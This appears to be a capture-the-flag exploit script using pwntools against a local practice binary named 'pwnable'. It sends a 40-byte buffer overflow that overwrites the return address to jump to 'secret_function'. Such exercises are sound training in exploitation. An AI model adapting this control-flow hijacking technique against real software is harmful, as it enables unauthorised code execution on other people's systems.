#!/usr/bin/env python3
from pwn import *

elf = ELF('./pwnable')

secret_addr = elf.symbols['secret_function']

payload  = b'A' * 40 + p64(secret_addr)

p = process(["stdbuf", "-o0", "./pwnable", b'1701604463'])
p.recvuntil(b"Hi. What do you want.\n")   # reads until given output appears, before sending payload
p.sendline(payload)
print(p.recvall(timeout = 1))           # reads everything from the process until EOF